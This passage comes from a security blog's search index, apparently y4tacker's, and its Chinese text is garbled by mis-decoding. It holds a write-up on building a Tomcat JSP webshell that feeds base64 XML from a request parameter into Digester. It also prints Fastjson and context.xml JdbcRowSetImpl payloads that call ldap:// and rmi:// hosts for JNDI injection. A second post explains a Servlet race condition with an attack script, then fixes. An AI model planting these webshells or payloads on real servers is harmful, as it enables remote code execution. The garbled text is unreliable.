æ¥ä¸‹æ¥åœ¨è§£æé˜¶æ®µï¼Œåœ¨å…¶ä¸­çš„org.apache.tomcat.util.digester.Digester#startElementå¼•èµ·äº†æˆ‘çš„æ³¨æ„ è¿™é‡Œå¦‚æœåŒ¹é…åˆ°æ ‡ç­¾Contextæˆ–Manageråˆ™ä¼šå»è°ƒç”¨org.apache.tomcat.util.digester.SetPropertiesRule#begin,è€Œè¿™ä¸ªå‡½æ•°ä¸­å–å‡ºå±æ€§èµ‹å€¼çš„åœ°æ–¹å¦‚ä¸‹ ä¹‹åé€šè¿‡è°ƒç”¨setPropertyæ–¹æ³•ï¼Œå»è°ƒç”¨å±æ€§çš„setæ–¹æ³•ï¼Œå…·ä½“å¦‚ä¸‹(éƒ¨åˆ†æˆªå›¾) åˆ°äº†è¿™é‡Œä¸€ä¸ªæ€è·¯å°±æ¶Œç°åœ¨æˆ‘è„‘ä¸­ï¼Œè¿˜è®°å¾—fastJsonçš„ç¬¬ä¸€ä¸ªpayloadå— 12345&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://vps/TouchFile&quot;, &quot;autoCommit&quot;:true&#125; è¿™ä¸å°±æ˜¯éƒ½æ˜¯setçš„è¿‡ç¨‹ ä¹‹åæˆ‘åœ¨contenx.xmlä¸­åŠ ä¸Š 123&lt;Manager className=&quot;com.sun.rowset.JdbcRowSetImpl&quot; dataSourceName=&quot;rmi://127.0.0.1/Exploit&quot; autoCommit=&quot;true&quot;&gt;&lt;/Manager&gt; å†æ¬¡å¯åŠ¨tomcatï¼ŒæˆåŠŸå¼¹å‡ºäº†è®¡ç®—å™¨ æ–°çš„é—®é¢˜å¯æ˜¯è¿™ä¸ªåˆ©ç”¨é“¾è¿‡ç¨‹æ˜¯åœ¨tomcatå¯åŠ¨çš„è¿‡ç¨‹å•Šï¼Œè¦æƒ³å½»åº•è§£å†³æˆ‘ä»¬è¿˜å¾—å»çœ‹çœ‹å®ƒæ˜¯é€šè¿‡ä»€ä¹ˆå‡½æ•°è¿›è¡Œè§£æï¼Œä»¥åŠæˆ‘ä»¬æ˜¯å¦èƒ½æ§åˆ¶å‘¢ åœ¨org.apache.catalina.startup.ContextConfig#initä¸­ï¼Œæˆ‘ä»¬çœ‹çœ‹å…³é”®çš„æ­¥éª¤ 12345678 protected void init() &#123; Digester contextDigester = createContextDigester(); contextDigester.getParser();---------------- contextConfig(contextDigester); &#125; å¯ä»¥çœ‹åˆ°å‡½æ•°contextConfigä¸­ä¼ å…¥ä¸€ä¸ªcontextDigesterå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æˆ‘ä»¬ä¹Ÿå¾ˆå¥½å¾—åˆ°ï¼Œè™½ç„¶è¿™æ˜¯ä¸€ä¸ªprotectedä¿®é¥°çš„å‡½æ•°ï¼Œä½†æ˜¯é‡Œé¢çš„è¿‡ç¨‹å´éƒ½æ˜¯publicä¿®é¥°çš„ï¼Œå› æ­¤æˆ‘ä»¬ç›´æ¥å¤åˆ¶å‡ºæ¥å³å¯ ç»§ç»­è·Ÿè¿›æ‰§è¡Œåœ¨org.apache.catalina.startup.ContextConfig#contextConfigï¼Œæœ€å¼€å§‹æˆ‘ä»¬ä¾¿æåˆ°äº†è¦ä¹ˆä»æ ‡å‡†ä¸Šä¸‹æ–‡ï¼Œè¦ä¹ˆåˆ™æ˜¯é»˜è®¤å€¼conf/context.xmlï¼Œé‚£ä¹ˆä¸ºäº†æ‰©å±•æ”»å‡»é¢åˆ©ç”¨æˆ‘ä»¬è‚¯å®šé€‰æ‹©å‰è€… æµç¨‹å®ç°æ„é€ Webshellå› æ­¤ï¼Œæˆ‘ä»¬å†æ¢³ç†ä¸€ä¸‹ä¸Šé¢çš„åˆ©ç”¨æµç¨‹ 1.å®ä¾‹åŒ–ContextConfig 2.è·å–StandardContextï¼Œæ·»åŠ åˆ°ContextConfigçš„context 3.åˆå§‹åŒ–Digesterå¯¹è±¡ 4.è°ƒç”¨ContextConfigçš„contextConfigå‡½æ•°æ‰§è¡Œåˆ©ç”¨è¿‡ç¨‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;%@ page import=&quot;org.apache.catalina.startup.ContextConfig&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.digester.Digester&quot; %&gt;&lt;%@ page import=&quot;java.util.List&quot; %&gt;&lt;%@ page import=&quot;java.util.HashMap&quot; %&gt;&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.digester.RuleSet&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.startup.ContextRuleSet&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.startup.NamingRuleSet&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;% ContextConfig ctConfig = new ContextConfig(); //è·å–StandardContext Field reqF = request.getClass().getDeclaredField(&quot;request&quot;); reqF.setAccessible(true); Request req = (Request) reqF.get(request); StandardContext stcontext = (StandardContext) req.getContext(); stcontext.setDefaultContextXml(&quot;/tmp/context.xml&quot;); Field context = ContextConfig.class.getDeclaredField(&quot;context&quot;); context.setAccessible(true); context.set(ctConfig,stcontext); //å®ä¾‹åŒ–Digesterå¯¹è±¡ Digester digester = new Digester(); digester.setValidating(false); digester.setRulesValidation(true); HashMap&lt;Class&lt;?&gt;, List&lt;String&gt;&gt; fakeAttributes = new HashMap&lt;&gt;(); ArrayList&lt;String&gt; attrs = new ArrayList&lt;&gt;(); attrs.add(&quot;className&quot;); fakeAttributes.put(Object.class, attrs); digester.setFakeAttributes(fakeAttributes); RuleSet contextRuleSet = new ContextRuleSet(&quot;&quot;, false); digester.addRuleSet(contextRuleSet); RuleSet namingRuleSet = new NamingRuleSet(&quot;Context/&quot;); digester.addRuleSet(namingRuleSet); digester.getParser(); //è°ƒç”¨contextConfigå‡½æ•°æ‰§è¡Œåˆ©ç”¨è¿‡ç¨‹ Method contextConfig = ContextConfig.class.getDeclaredMethod(&quot;contextConfig&quot;, Digester.class); contextConfig.setAccessible(true); contextConfig.invoke(ctConfig,digester);%&gt; åœ¨æµè§ˆå™¨ç›´æ¥è®¿é—®ï¼ŒæˆåŠŸå¼¹å‡º æ·±å…¥æ€è€ƒéš¾é“è¿™å°±å¤Ÿäº†å—ï¼Œçœ‹ç€è¿™ä¸²åˆè‡­åˆé•¿çš„webshellæˆ‘ä¸€ç‚¹éƒ½ä¸æ»¡è¶³ï¼Œæˆ‘æƒ³è®©è¿™ä¸ªwebshellæ›´çŸ­ä¸€ç‚¹ï¼Œé‚£ä¹ˆä¸ºäº†å®ç°è¿™ä¸€æ­¥é‚£å°±å¾—è·Ÿæ·±å…¥çš„å¯¹åˆ©ç”¨æµç¨‹è¿›è¡Œè·Ÿè¸ª æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨org.apache.catalina.startup.ContextConfig#contextConfigï¼Œåœ¨è°ƒç”¨processContextConfigçš„æ—¶å€™ å¯ä»¥çœ‹åˆ°åœ¨å®é™…ä¸Šä¸»è¦çš„æ­¥éª¤è¿˜æ˜¯åœ¨å¯¹Digesterå¯¹è±¡ç»§ç»­çš„æ·»åŠ åŠ è½½å™¨ç­‰æ“ä½œä»¥åŠæœ€ç»ˆè°ƒç”¨parseå‡½æ•°ï¼Œåœ¨å…¶ä¸­å”¯ä¸€å¤šå‡ºæ¥çš„éƒ¨åˆ†å°±æ˜¯è¿™ä¸ªInputSource é‚£ä¹ˆå»æ‰ä¸€äº›æ— å…³çš„æ“ä½œæœ€ç»ˆå¾—åˆ°ï¼Œå½“ç„¶è¿™éƒ¨åˆ†å°±æ˜¯è‡ªå·±å¯»æ‰¾çš„è¿‡ç¨‹å°±æ²¡å¿…è¦å†™è¿›æ¥äº† 1234567&lt;% org.apache.tomcat.util.digester.Digester digester = new org.apache.tomcat.util.digester.Digester(); digester.addRuleSet(new org.apache.catalina.startup.ContextRuleSet(&quot;&quot;, false)); org.xml.sax.InputSource inputSource = new org.xml.sax.InputSource(); inputSource.setByteStream(new java.io.ByteArrayInputStream(java.util.Base64.getDecoder().decode(request.getParameter(&quot;cmd&quot;)))); digester.parse(inputSource);%&gt; æµ‹è¯•æ‰§è¡ŒæˆåŠŸ å…¶ä¸­cmdè§£ç å†…å®¹ä¸º 12345678&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;&lt;Context&gt; &lt;Manager className=&quot;com.sun.rowset.JdbcRowSetImpl&quot; dataSourceName=&quot;rmi://127.0.0.1/Exploit&quot; autoCommit=&quot;true&quot;&gt;&lt;/Manager&gt;&lt;/Context&gt; å½“ç„¶è¿˜æœ‰ä¸ªå…³é”®çš„å°±æ˜¯ä¸è¦å¿˜äº†å¯åŠ¨ä¸€ä¸ªæ¶æ„jndiæœåŠ¡","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Tomcat","slug":"Tomcat","permalink":"https://y4tacker.github.io/tags/Tomcat/"},{"name":"Jsp","slug":"Jsp","permalink":"https://y4tacker.github.io/tags/Jsp/"}]},{"title":"Servletçš„çº¿ç¨‹å®‰å…¨é—®é¢˜","slug":"year/2022/2/Servletçš„çº¿ç¨‹å®‰å…¨é—®é¢˜","date":"2022-02-03T02:02:18.000Z","updated":"2024-08-04T09:01:49.112Z","comments":true,"path":"2022/02/03/year/2022/2/Servletçš„çº¿ç¨‹å®‰å…¨é—®é¢˜/","link":"","permalink":"https://y4tacker.github.io/2022/02/03/year/2022/2/Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/","excerpt":"","text":"Servletçš„çº¿ç¨‹å®‰å…¨é—®é¢˜å¼•å…¥é¦–å…ˆçœ‹çœ‹è¿™æ ·çš„ä»£ç ï¼Œæœ‰ä»€ä¹ˆé—®é¢˜ è¿™é‡Œæ—¢è¦æ±‚cmdä¸èƒ½åŒ…å«Calculatoråˆå¿…é¡»è¦åŒ…å«Calculatorï¼Œèƒ½åšåˆ°å—ï¼Œå½“ç„¶æ˜¯å¯ä»¥çš„ Servletçš„å¤šçº¿ç¨‹æœºåˆ¶Servletå®é™…ä¸Šæ˜¯ä¸€ä¸ªå•ä»¶ï¼Œå½“æˆ‘ä»¬ç¬¬ä¸€æ¬¡è¯·æ±‚æŸä¸ªServletæ—¶ï¼ŒServletå®¹å™¨å°†ä¼šæ ¹æ®web.xmlé…ç½®æ–‡ä»¶æˆ–è€…æ˜¯æ³¨è§£å®ä¾‹åŒ–è¿™ä¸ªServletç±»ï¼Œä¹‹åå¦‚æœåˆæœ‰æ–°çš„å®¢æˆ·ç«¯è¯·æ±‚è¯¥Servletæ—¶ï¼Œåˆ™ä¸€èˆ¬ä¸ä¼šå†å®ä¾‹åŒ–è¯¥Servletç±»ï¼Œè¿™è¯´æ˜äº†ä»€ä¹ˆå‘¢ï¼Ÿç®€å•æ¥è¯´ï¼Œå½“å¤šä¸ªç”¨æˆ·ä¸€èµ·è®¿é—®æ—¶ï¼Œå¾—åˆ°çš„å…¶å®æ˜¯åŒä¸€ä¸ªServletå®ä¾‹ï¼Œè¿™æ ·çš„è¯ï¼Œä»–ä»¬å¯¹å®ä¾‹çš„æˆå‘˜å˜é‡çš„ä¿®æ”¹å…¶å®ä¼šå½±å“åˆ°åˆ«äººï¼Œæ‰€ä»¥åœ¨å¼€å‘çš„æ—¶å€™å¦‚æœæ²¡æœ‰æ³¨æ„è¿™ä¸ªé—®é¢˜å¾€å¾€ä¼šæœ‰ä¸€äº›é¢å®‰å…¨é—®é¢˜ï¼Œè€Œå¾€å¾€Servletçš„çº¿ç¨‹å®‰å…¨é—®é¢˜ä¸»è¦æ˜¯ç”±äºå®ä¾‹å˜é‡ä½¿ç”¨ä¸å½“è€Œå¼•èµ· å› æ­¤æˆ‘ä»¬å†çœ‹ä¸Šé¢çš„ä»£ç ï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬çœ‹åˆ°äº†è¿™ä¸ªstatusçŠ¶æ€å˜é‡æ˜¯å®ä¾‹å˜é‡ï¼Œå½“ç„¶è¿™é‡Œä¸ºäº†çªå‡ºå¹¶å‘çš„æ•ˆæœï¼Œè¿™é‡ŒåŠ äº†ä¸€ä¸ªå»¶æ—¶ï¼Œè¿™é‡Œç®€ç®€å•å•ç”¨pythonå®ç°ç«äº‰ï¼Œä¹Ÿä¸å¿…ä¸Šå¤šçº¿ç¨‹äº†ç®€å•ç‚¹ 123456url = &quot;http://127.0.0.1:8080/?cmd=open -na Calculator&quot;while 1: r = requests.get(url) if &quot;Cal&quot; in r.text: print(r.text) 1234url = &quot;http://127.0.0.1:8080/?cmd=ls&quot;while 1: r = requests.get(url) å¦‚ä½•ä¿®å¤1.å®ç° SingleThreadModel æ¥å£è¯¥æ¥å£æŒ‡å®šäº†ç³»ç»Ÿå¦‚ä½•å¤„ç†å¯¹åŒä¸€ä¸ªServletçš„è°ƒç”¨ã€‚å¦‚æœä¸€ä¸ªServletè¢«è¿™ä¸ªæ¥å£æŒ‡å®šï¼Œé‚£ä¹ˆåœ¨è¿™ä¸ªServletä¸­çš„serviceæ–¹æ³•å°†ä¸ä¼šæœ‰ä¸¤ä¸ªçº¿ç¨‹è¢«åŒæ—¶æ‰§è¡Œï¼Œå½“ç„¶ä¹Ÿå°±ä¸å­˜åœ¨çº¿ç¨‹å®‰å…¨çš„é—®é¢˜ã€‚è¿™ç§æ–¹æ³•åªè¦ç»§æ‰¿è¿™ä¸ªæ¥å£å°±è¡Œäº†,å› æ­¤å°†æˆ‘ä»¬ä¸Šé¢çš„ä»£ç æ”¹ä¸º 1public class TestServlet extends HttpServlet implements SingleThreadModel è¿™æ ·ä½ è§‰å¾—å°±å®Œå…¨å®‰å…¨äº†å—ï¼Ÿï¼Ÿç­”æ¡ˆä¹Ÿä¸æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å°†ä¸Šé¢çš„å¯¹çŠ¶æ€çš„å®šä¹‰åŠ ä¸Šstaticå‘¢ 1public static boolean status; lolï¼Œè¿˜æ˜¯å¯ä»¥æˆåŠŸï¼ŒåŸå› æ˜¯SingleThreadModelä¸ä¼šè§£å†³æ‰€æœ‰çš„çº¿ç¨‹å®‰å…¨éšæ‚£ã€‚ä¼šè¯å±æ€§å’Œé™æ€å˜é‡ä»ç„¶å¯ä»¥è¢«å¤šçº¿ç¨‹çš„å¤šè¯·æ±‚åŒæ—¶è®¿é—® è¿˜æœ‰ä¸€ç‚¹å¾ˆé‡è¦è¯¥æ¥å£åœ¨Servlet API 2.4ä¸­å°†ä¸æ¨èä½¿ç”¨ã€‚ 2.é¿å…ä½¿ç”¨æˆå‘˜å˜é‡æ—¢ç„¶é—®é¢˜å‡ºè‡ªæˆå‘˜å˜é‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°½é‡é¿å…å»ä½¿ç”¨å®ƒ å°†ä¸Šé¢çš„ä»£ç æ”¹ä¸º 12345678910111213141516171819202122232425public class TestServlet extends HttpServlet&#123;// public boolean status; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; boolean status = true; String cmd = req.getParameter(&quot;cmd&quot;); if (cmd.contains(&quot;Calculator&quot;)) &#123; status = false; try &#123; Thread.sleep(1000); &#125;catch (Exception e)&#123; &#125; &#125; if (!status) &#123; return; &#125; if (cmd.contains(&quot;Calculator&quot;))&#123; resp.getWriter().write(cmd); &#125; &#125;&#125; 3.åŒæ­¥å¯¹å…±äº«æ•°æ®çš„æ“ä½œä½¿ç”¨synchronized å…³é”®å­—èƒ½ä¿è¯ä¸€æ¬¡åªæœ‰ä¸€ä¸ªçº¿ç¨‹å¯ä»¥è®¿é—®è¢«ä¿æŠ¤çš„åŒºæ®µï¼Œå› æ­¤å¯ä»¥å°†ä»£ç å†™ä¸º 1234567891011121314151617181920212223242526272829public class TestServlet extends HttpServlet&#123; public boolean status; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; String cmd = req.getParameter(&quot;cmd&quot;); boolean status; synchronized(this) &#123; status = true; if (cmd.contains(&quot;Calculator&quot;)) &#123; status = false; try &#123; Thread.sleep(5000); &#125; catch (Exception e) &#123; &#125; &#125; &#125; if (!status) &#123; return; &#125; if (cmd.contains(&quot;Calculator&quot;))&#123; resp.getWriter().write(cmd); &#125; &#125;&#125; æ€è€ƒä¸å°ç»“ä½†æ˜¯å¦‚æœåˆ©ç”¨ä¸Šé¢ä¸‰ç§æ–¹å¼å»ä¿®å¤ï¼Œè¿™æ ·å°±å®Œå…¨æ²¡é—®é¢˜äº†å—ï¼Ÿå¹¶ä¸æ˜¯ æ¯”å¦‚å®ç°SingleThreadModelä»¥åŠåœ¨ç¨‹åºä¸­ä½¿ç”¨åŒæ­¥æ¥ä¿æŠ¤è¦ä½¿ç”¨çš„å…±äº«çš„æ•°æ®ï¼Œåœ¨å®é™…ä¸šåŠ¡å½“ä¸­è¿™ä¹Ÿä¼šä½¿å¾—æˆ‘ä»¬ç³»ç»Ÿçš„æ€§èƒ½å¤§å¤§ä¸‹é™ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬ä¸å¤ªå¸Œæœ›çœ‹åˆ°çš„ï¼Œå‰è€…ä¸ºæ¯ä¸ªæ–°çš„è¯·æ±‚åˆ›å»ºä¸€ä¸ªå•ç‹¬çš„Servletå®ä¾‹ï¼Œè¿™å°†å¼•èµ·å¤§é‡çš„ç³»ç»Ÿå¼€é”€ï¼Œè€Œåè€…è¢«åŒæ­¥çš„ä»£ç å—åœ¨åŒä¸€æ—¶åˆ»ä¹Ÿåªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œå®ƒï¼Œè¿™ä¹Ÿä¼šå¯¼è‡´åœ¨é«˜å¹¶å‘çš„æƒ…å†µä¸‹ï¼ŒåŒæ—¶å¤„ç†è¯·æ±‚çš„ååé‡æ˜¾è‘—çš„é™ä½ å› æ­¤ï¼Œåœ¨Serletä¸­é¿å…ä½¿ç”¨å®ä¾‹å˜é‡æˆ–è®¸æ˜¯æ›´å¥½çš„é€‰æ‹©ï¼Œä½†å¦‚æœæ— æ³•é¿å…ï¼Œä½†å¦‚æœæ— æ³•é¿å…ï¼Œä¹Ÿåº”è¯¥å°½é‡åšåˆ°å»åŒæ­¥å¯ç”¨æ€§æœ€å°çš„ä»£ç è·¯å¾„ å‚è€ƒæ–‡ç« https://www.cnblogs.com/chanshuyi/p/5052426.html https://zhuanlan.zhihu.com/p/93708538 https://www.jianshu.com/p/06260e0667a9","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Tomcat","slug":"Tomcat","permalink":"https://y4tacker.github.io/tags/Tomcat/"}]}],"categories":[{"name":"éšç¬”","slug":"éšç¬”","permalink":"https://y4tacker.github.io/categories/%E9%9A%8F%E7%AC%94/"},{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"},{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/categories/PHP/"},{"name":"Python","slug":"Python","permalink":"https://y4tacker.github.io/categories/Python/"},{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/categories/CTF/"},{"name":"php","slug":"php","permalink":"https://y4tacker.github.io/categories/php/"},{"name":"PTES","slug":"PTES","permalink":"https://y4tacker.github.io/categories/PTES/"},{"name":"æ€»ç»“","slug":"æ€»ç»“","permalink":"https://y4tacker.github.io/categories/%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"éšç¬”","slug":"éšç¬”","permalink":"https://y4tacker.github.io/tags/%E9%9A%8F%E7%AC%94/"},{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"GeoServer","slug":"GeoServer","permalink":"https://y4tacker.github.io/tags/GeoServer/"},{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/tags/PHP/"},{"name":"ShowDoc","slug":"ShowDoc","permalink":"https://y4tacker.github.io/tags/ShowDoc/"},{"name":"é€šå¤©æ˜Ÿ","slug":"é€šå¤©æ˜Ÿ","permalink":"https://y4tacker.github.io/tags/%E9%80%9A%E5%A4%A9%E6%98%9F/"},{"name":"H3C","slug":"H3C","permalink":"https://y4tacker.github.io/tags/H3C/"},{"name":"CrushFTP","slug":"CrushFTP","permalink":"https://y4tacker.github.io/tags/CrushFTP/"},{"name":"Smartbi","slug":"Smartbi","permalink":"https://y4tacker.github.io/tags/Smartbi/"},{"name":"Jenkis","slug":"Jenkis","permalink":"https://y4tacker.github.io/tags/Jenkis/"},{"name":"Python","slug":"Python","permalink":"https://y4tacker.github.io/tags/Python/"},{"name":"Gitlab","slug":"Gitlab","permalink":"https://y4tacker.github.io/tags/Gitlab/"},{"name":"Trick","slug":"Trick","permalink":"https://y4tacker.github.io/tags/Trick/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://y4tacker.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"Apache","slug":"Apache","permalink":"https://y4tacker.github.io/tags/Apache/"},{"name":"Apusic","slug":"Apusic","permalink":"https://y4tacker.github.io/tags/Apusic/"},{"name":"IDEA","slug":"IDEA","permalink":"https://y4tacker.github.io/tags/IDEA/"},{"name":"FernFlower","slug":"FernFlower","permalink":"https://y4tacker.github.io/tags/FernFlower/"},{"name":"Struts2","slug":"Struts2","permalink":"https://y4tacker.github.io/tags/Struts2/"},{"name":"Fastjson","slug":"Fastjson","permalink":"https://y4tacker.github.io/tags/Fastjson/"},{"name":"TemplatesImpl","slug":"TemplatesImpl","permalink":"https://y4tacker.github.io/tags/TemplatesImpl/"},{"name":"è¸©å‘è®°å½•","slug":"è¸©å‘è®°å½•","permalink":"https://y4tacker.github.io/tags/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"},{"name":"Go","slug":"Go","permalink":"https://y4tacker.github.io/tags/Go/"},{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/tags/CTF/"},{"name":"Nodejs","slug":"Nodejs","permalink":"https://y4tacker.github.io/tags/Nodejs/"},{"name":"Webshell","slug":"Webshell","permalink":"https://y4tacker.github.io/tags/Webshell/"},{"name":"Apache Commons Text","slug":"Apache-Commons-Text","permalink":"https://y4tacker.github.io/tags/Apache-Commons-Text/"},{"name":"Apache Commons Jxpath","slug":"Apache-Commons-Jxpath","permalink":"https://y4tacker.github.io/tags/Apache-Commons-Jxpath/"},{"name":"Log4j2","slug":"Log4j2","permalink":"https://y4tacker.github.io/tags/Log4j2/"},{"name":"Waf","slug":"Waf","permalink":"https://y4tacker.github.io/tags/Waf/"},{"name":"pearcmd","slug":"pearcmd","permalink":"https://y4tacker.github.io/tags/pearcmd/"},{"name":"PTES","slug":"PTES","permalink":"https://y4tacker.github.io/tags/PTES/"},{"name":"Rasp","slug":"Rasp","permalink":"https://y4tacker.github.io/tags/Rasp/"},{"name":"Jsp","slug":"Jsp","permalink":"https://y4tacker.github.io/tags/Jsp/"},{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"https://y4tacker.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"æ€»ç»“","slug":"æ€»ç»“","permalink":"https://y4tacker.github.io/tags/%E6%80%BB%E7%BB%93/"},{"name":"Kryo","slug":"Kryo","permalink":"https://y4tacker.github.io/tags/Kryo/"},{"name":"Serialkiller","slug":"Serialkiller","permalink":"https://y4tacker.github.io/tags/Serialkiller/"},{"name":"Shiro","slug":"Shiro","permalink":"https://y4tacker.github.io/tags/Shiro/"},{"name":"Enjoyæ¨¡æ¿","slug":"Enjoyæ¨¡æ¿","permalink":"https://y4tacker.github.io/tags/Enjoy%E6%A8%A1%E6%9D%BF/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://y4tacker.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"XStream","slug":"XStream","permalink":"https://y4tacker.github.io/tags/XStream/"},{"name":"SnakeYAML","slug":"SnakeYAML","permalink":"https://y4tacker.github.io/tags/SnakeYAML/"},{"name":"SpEL","slug":"SpEL","permalink":"https://y4tacker.github.io/tags/SpEL/"},{"name":"C3P0","slug":"C3P0","permalink":"https://y4tacker.github.io/tags/C3P0/"},{"name":"Tomcat","slug":"Tomcat","permalink":"https://y4tacker.github.io/tags/Tomcat/"}]}